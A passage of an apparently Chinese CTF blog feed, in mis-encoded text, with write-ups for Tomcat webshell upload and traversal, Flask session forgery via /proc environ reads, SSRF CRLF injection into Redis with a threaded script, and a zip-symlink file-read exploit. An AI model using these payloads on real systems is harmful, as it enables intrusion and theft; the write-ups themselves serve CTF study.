title="TOMCATç®¡ç†ç«¯å¼±å£ä»¤"></a>TOMCATç®¡ç†ç«¯å¼±å£ä»¤</h3><p>æ ¹æ®åšé¢˜ç»éªŒï¼Œä¸€èˆ¬æ˜¯å¼±å£ä»¤æˆ–è€…é»˜è®¤å£ä»¤ï¼Œç”¨æˆ·åä¸€èˆ¬å°±æ˜¯tomcatï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹å¾—åˆ°å¯†ç ä¹Ÿæ˜¯tomcat</p><h3 id="åå°ä¸Šä¼ waræœ¨é©¬"><a href="#åå°ä¸Šä¼ waræœ¨é©¬" class="headerlink" title="åå°ä¸Šä¼ waræœ¨é©¬"></a>åå°ä¸Šä¼ waræœ¨é©¬</h3><p><a href="https://github.com/LandGrey/webshell-detect-bypassï¼Œç”¨è¿™é‡Œé¢çš„poc" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypassï¼Œç”¨è¿™é‡Œé¢çš„poc</a></p><p>æŠŠjspæ‰“åŒ…å‹ç¼©æˆwaræ–‡ä»¶ï¼ŒburpæŠ“åŒ…ä¸Šä¼ </p><img src="/2020/07/28/WUSTCTF2020/4.png" class=""><p>å¯ä»¥å‘ç°æ˜¯è‡ªåŠ¨è¿›è¡Œäº†è·¯å¾„æ‹¼æ¥ï¼Œå»æ‰exampleç»§ç»­è®¿é—®</p><img src="/2020/07/28/WUSTCTF2020/5.png" class=""><p>è¿”å›401ï¼ŒUnauthorized</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªæ–°çŸ¥è¯†ç‚¹ï¼Œ<a href="https://www.jianshu.com/p/4cd42f7359f4ï¼Œè¯¦ç»†ä»‹ç»" target="_blank" rel="noopener">https://www.jianshu.com/p/4cd42f7359f4ï¼Œè¯¦ç»†ä»‹ç»</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic base64encode(username+&quot;:&quot;+password)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åŠ ä¸Šå¤´å­—æ®µå°±è¡Œ</p><p>è¿™æ—¶å€™ä¼šå‘ç°è¿”å›403ï¼Œè·¯å¾„è®¿é—®åˆ°äº†ï¼Œå´æ— æ³•è®¿é—®ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯æƒé™ä¸å¤Ÿï¼Œç¼ºå°‘cookieï¼Œè¿™é‡ŒåŠ ä¸Šcookieå­—æ®µï¼Œå¦‚æœè¿˜æ˜¯403ï¼Œå†åˆ·æ–°ä¸€ä¸‹cookieè¿›è¡Œæ·»åŠ å³å¯</p><img src="/2020/07/28/WUSTCTF2020/6.png" class=""><p>å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„1.warå·²ç»ä¸Šä¼ åŠ è½½å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®¿é—®ğŸåœ¨çš„è·¯å¾„äº†</p><img src="/2020/07/28/WUSTCTF2020/7.png" class=""><p>åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°è·¯å¾„éƒ½æ²¡æœ‰é”™ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½è®¿é—®ï¼ŒçŒœæµ‹è¿™é‡Œå¯èƒ½è¿˜æ˜¯è¦è¿›è¡Œç›®å½•ç©¿è¶Šï¼ŒåŠ ä¸Š/..;/æˆåŠŸ</p><img src="/2020/07/28/WUSTCTF2020/8.png" class=""><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œå’ŒåŸé¢˜è¿˜æ˜¯ä¸å¤ªä¸€æ ·ï¼ŒåŸé¢˜è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°trickï¼Œè¿™é‡Œç›´æ¥è¯»å°±è¡Œäº†</p><img src="/2020/07/28/WUSTCTF2020/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb
    
    </summary>
    
    
    
      <category term="WUST" scheme="http://yoursite.com/tags/WUST/"/>
    
  </entry>
  
  <entry>
    <title>PASECA2019-honey-shop</title>
    <link href="http://yoursite.com/2020/07/27/PASECA2019-honey-shop/"/>
    <id>http://yoursite.com/2020/07/27/PASECA2019-honey-shop/</id>
    <published>2020-07-27T04:00:15.000Z</published>
    <updated>2020-07-27T04:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul><li>flask_session</li><li>linuxä¸‹çš„å½“å‰è¿›ç¨‹ç¯å¢ƒå˜é‡æŸ¥çœ‹</li></ul><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªè´­ä¹°é¡µé¢ï¼ŒæŠ“ä¸ªåŒ…</p><img src="/2020/07/27/PASECA2019-honey-shop/1.png" class=""><p>çœ‹åˆ°sessionçš„æ ¼å¼ä¸ç”¨æƒ³å°±æ˜¯flask_sessionï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°secret_keyæ¥ä¼ªé€ sessionè¾¾åˆ°ä¿®æ”¹é‡‘é’±çš„ç›®çš„</p><p>æ¥ç€ç½‘é¡µæºä»£ç çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰æç¤º</p><img src="/2020/07/27/PASECA2019-honey-shop/2.png" class=""><p>å­˜åœ¨downloadè·¯å¾„å¯ä»¥ä¸‹è½½å›¾ç‰‡</p><p>è¿™é‡Œå°±æ˜¯æœ€åçš„åˆ©ç”¨ç‚¹äº†</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹/etc/passwd</p><img src="/2020/07/27/PASECA2019-honey-shop/3.png" class=""><p>è¿™é‡Œæ²¡æœ‰å…¶ä»–ç”¨æˆ·ä¹Ÿæ²¡æœ‰bashï¼Œå°±ä¸èƒ½çŸ¥æ™“pythonçš„è·¯å¾„ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡</p><img src="/2020/07/27/PASECA2019-honey-shop/4.png" class=""><p>æ‹¿åˆ°äº†secret_key,ä¼ªé€ session</p><img src="/2020/07/27/PASECA2019-honey-shop/5.png" class=""><p>åœ¨é¢˜ç›®é¡µé¢æ›¿æ¢ä¸€ä¸‹cookieå°±èƒ½è´­ä¹°flagäº†</p><img src="/2020/07/27/PASECA2019-honey-shop/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF-2016-Web7</title>
    <link href="http://yoursite.com/2020/07/27/SWPUCTF-2016-Web7/"/>
    <id>http://yoursite.com/2020/07/27/SWPUCTF-2016-Web7/</id>
    <published>2020-07-27T03:11:53.000Z</published>
    <updated>2020-08-03T08:06:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul><li>urllib2.urlopen()ä¸æ”¯æŒgopheråè®®</li><li>urllib2.urlopen()æœªè€ƒè™‘æ¢è¡Œç¬¦</li><li>rediså†™æ•°æ®çš„æ–¹æ³•</li></ul><h2 id="è§£é¢˜æ­¥éª¤ï¼š"><a href="#è§£é¢˜æ­¥éª¤ï¼š" class="headerlink" title="è§£é¢˜æ­¥éª¤ï¼š"></a>è§£é¢˜æ­¥éª¤ï¼š</h2><p>python2.7.5+redis2.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(self,url=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        file=open(<span class="string">"index.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">"url"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">"é”™è¯¯"</span>+str(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,password=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">""</span></span><br><span class="line">        file=open(<span class="string">"login.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            re=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">"password"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">"admin"</span>)==password:</span><br><span class="line">                re=open(<span class="string">"flag"</span>,<span class="string">'r'</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">"Can't find admin:"</span>+password+<span class="string">",fast fast fast....."</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">'server.socket_host'</span>: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">                        <span class="string">'server.socket_port'</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure><p>åˆ†æä¸Šé¢çš„ä»£ç ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬æœ‰ä¸¤ä¸ªè¾“å…¥çš„åœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¾“å…¥urlï¼Œurllib2.urlopen()ä¼šå¯¹æˆ‘ä»¬è¾“å…¥çš„urlè¿›è¡Œè®¿é—®ï¼Œå¦‚æœä¸ç¬¦åˆçš„è¯å°±ä¼šæŠ¥é”™ã€‚ç¬¬äºŒä¸ªå¯¹æ–¹å°±æ˜¯ç™»å½•æ£€éªŒï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸç™»å½•çš„è¯å°±ä¼šç»™åˆ°flagã€‚è¿™é‡Œåº”è¯¥æ˜¯è¦ssrf+redisäº†ï¼Œä½†æ˜¯æ³¨æ„åˆ°urllib2.open()ä¸æ”¯æŒgopheråè®®ï¼Œå°±æ‰“ä¸åˆ°redisã€‚æŸ¥èµ„æ–™æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://bugs.python.org/issue30458ï¼Œå€Ÿç”¨æ–‡ç« çš„ä¾‹å­ï¼Œurllib2.open()æ˜¯ä¸ä¼šå¤„ç†æ¢è¡Œç¬¦çš„" target="_blank" rel="noopener">https://bugs.python.org/issue30458ï¼Œå€Ÿç”¨æ–‡ç« çš„ä¾‹å­ï¼Œurllib2.open()æ˜¯ä¸ä¼šå¤„ç†æ¢è¡Œç¬¦çš„</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">urlopen(<span class="string">"http://localhost:8000/ HTTP/1.1\r\nHEADER: INJECTED\r\nIgnore:"</span>)</span><br><span class="line"></span><br><span class="line">Data sent to the server:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.bind((<span class="string">"localhost"</span>, <span class="number">8000</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.listen()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[conn, addr] = server.accept()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pprint(conn.recv(<span class="number">300</span>).splitlines(keepends=<span class="literal">True</span>))</span><br><span class="line">[<span class="string">b'GET / HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'HEADER: INJECTED\r\n'</span>,</span><br><span class="line"> <span class="string">b'Ignore: HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'Accept-Encoding: identity\r\n'</span>,</span><br><span class="line"> <span class="string">b'User-Agent: Python-urllib/3.5\r\n'</span>,</span><br><span class="line"> <span class="string">b'Connection: close\r\n'</span>,</span><br><span class="line"> <span class="string">b'Host: localhost:8000\r\n'</span>,</span><br><span class="line"> <span class="string">b'\r\n'</span>]</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œç”¨æ¢è¡Œç¬¦ä¹Ÿå°±æ˜¯%0d%0a,æ’å…¥åˆ°æ­£å¸¸çš„urlä¸­å°±å¯ä»¥ç»•è¿‡äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payloadï¼šhttp:&#x2F;&#x2F;127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379&#x2F;foo</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“è¿‡å»ä¹‹åè¦å¿«é€Ÿç™»å½•ï¼Œå°±èƒ½æ‹¿åˆ°flagï¼Œå› ä¸ºåå°æœ‰è„šæœ¬åœ¨ä¸æ–­ä¿®æ”¹å¯†ç </p><img src="/2020/07/27/SWPUCTF-2016-Web7/1.png" class=""><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/input"</span></span><br><span class="line">            data = &#123;<span class="string">'value'</span>: <span class="string">'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'</span>&#125;</span><br><span class="line">            requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/admin"</span></span><br><span class="line">            data = &#123;<span class="string">'passworld'</span>: <span class="string">'xx00'</span>&#125;</span><br><span class="line">            text = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test2)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    i.join()</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><ul><li><a href="https://www.anquanke.com/post/id/84814" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84814</a></li><li><a href="https://bugs.python.org/issue30458" target="_blank" rel="noopener">https://bugs.python.org/issue30458</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;a href=&quot;#çŸ¥è¯†ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;çŸ¥è¯†ç‚¹&quot;&gt;&lt;/a&gt;çŸ¥è¯†ç‚¹
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-2018-Hideandseek</title>
    <link href="http://yoursite.com/2020/07/22/HCTF-2018-Hideandseek/"/>
    <id>http://yoursite.com/2020/07/22/HCTF-2018-Hideandseek/</id>
    <published>2020-07-22T12:08:41.000Z</published>
    <updated>2020-07-22T13:45:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åšçš„é¢˜å‘ç°å¯¹äºlinuxæ•´ä¸ªç³»ç»Ÿæ¶æ„çš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¾—æŠ½æ—¶é—´å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†<a id="more"></a></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li><strong>flask-cookieä¼ªé€ sessionï¼ŒåŠ è§£å¯†</strong></li><li><strong>zipè½¯é“¾æ¥æ„é€ ä»»æ„æ–‡ä»¶è¯»å–</strong></li><li><strong>ä¼ªéšæœºç§å­ç ´è§£</strong></li><li><strong>linuxç³»ç»Ÿç›®å½•çš„ç†Ÿæ‚‰</strong></li></ul><h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>å¼€é¢˜ï¼Œadminä¸èƒ½ç™»å½•ï¼Œä»»æ„å†™ä¸€ä¸ªè´¦å·å¯†ç ç™»å½•è·³è½¬åˆ°ä¸Šä¼ ç•Œé¢ï¼Œè¦æ±‚ä¸Šä¼ zipæ–‡ä»¶</p><img src="/2020/07/22/HCTF-2018-Hideandseek/1.png" class=""><p>éšä¾¿å‹ç¼©ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹ä¸ºpeguin</p><img src="/2020/07/22/HCTF-2018-Hideandseek/2.png" class=""><p>å¯ä»¥å‘ç°åå°åº”è¯¥æ˜¯å¯¹ä¸Šä¼ çš„å‹ç¼©æ–‡ä»¶è¿›è¡Œäº†è§£å‹ç¼©å’Œæ–‡ä»¶çš„è¯»å–</p><p>æŸ¥æ‰¾ä¸€ä¸‹èµ„æ–™ï¼Œæ‰¾åˆ°ä¸€ç¯‡blog<a href="https://www.cnblogs.com/Silkage/p/13218598.html" target="_blank" rel="noopener">https://www.cnblogs.com/Silkage/p/13218598.html</a></p><p>ä¸»è¦è®²è§£äº†æœ‰å…³zipè½¯é“¾æ¥çš„ç”¨æ³•ï¼Œå€Ÿç”¨æ–‡ä¸­çš„çŸ¥è¯†æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹æ„é€ ï¼Œè¯»å–ä¸€ä¸‹ç›®æ ‡æœåŠ¡å™¨çš„/etc/passwdä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">ç”Ÿæˆä¸€ä¸ªæŒ‡å‘&#x2F;etc&#x2F;passwdæ–‡ä»¶çš„è½¯é“¾æ¥</span><br><span class="line">zip -y passwd.zip passwd</span><br><span class="line">å°†è½¯é“¾æ¥è¿›è¡Œå‹ç¼©</span><br></pre></td></tr></table></figure><img src="/2020/07/22/HCTF-2018-Hideandseek/3.png" class=""><p>è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹æ‰¾æ¥çš„ç”Ÿæˆè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">'http://9ca78698-fdea-4321-8dbc-6ee2e38b1de3.node3.buuoj.cn/upload'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makezip</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">'ln -s '</span>+sys.argv[<span class="number">1</span>]+<span class="string">' exp'</span>)</span><br><span class="line">    os.system(<span class="string">'zip --symlinks exp.zip exp'</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'the_file'</span>:open(<span class="string">'./exp.zip'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    print(res.text)</span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">'rm -rf exp'</span>)</span><br><span class="line">os.system(<span class="string">'rm -rf exp.zip'</span>)</span><br></pre></td></tr></table></figure><p>æ¯æ¬¡è¯»å–ç›®æ ‡è·¯å¾„åªéœ€ä¸€ä¸‹å‘½ä»¤å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &#x2F;xxx&#x2F;xxx&#x2F;xxx</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ—¶æŠ“ä¸ªåŒ…ï¼Œæœ‰æ‰€å‘ç°</p><img src="/2020/07/22/HCTF-2018-Hideandseek/4.png" class=""><p>sessionå€¼å¾ˆç†Ÿæ‚‰ï¼Œä¸æ˜¯jwtå°±æ˜¯flask sessionï¼Œæ ¹æ®äºŒè€…ä¹‹é—´çš„å·®å¼‚ï¼Œåº”è¯¥å±äºåè€…</p><p>ç”¨è„šæœ¬è§£å¯†ä¸€ä¸‹çœ‹çœ‹å­˜å‚¨çš„æ˜¯ä»€ä¹ˆ</p><img src="/2020/07/22/HCTF-2018-Hideandseek/5.png" class=""><p>å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„æ˜¯åˆšåˆšç™»å½•æ—¶å€™çš„ç”¨æˆ·åï¼Œè”æƒ³åˆ°åˆšæ‰adminè´¦æˆ·æ— æ³•ç™»å½•ï¼Œåº”è¯¥æ˜¯å·²ç»æ³¨å†Œäº†ï¼Œé‚£å°±éœ€è¦ä¼ªé€ flask sessionï¼Œé‚£ä¹ˆå°±è¦æ‹¿åˆ°secret key</p><p>è¿™é‡Œå°±æ˜¯æ–°æ¥è§¦çš„çŸ¥è¯†å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œ</span><br><span class="line">ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</span><br><span class="line">environæ˜¯ â€” å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œselfå¯ä»¥æ›¿æ¢æˆè¿›ç¨‹å·ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ç¯‡æœ‰å…³/procç›®å½•è®²è§£çš„æ–‡ç« <a 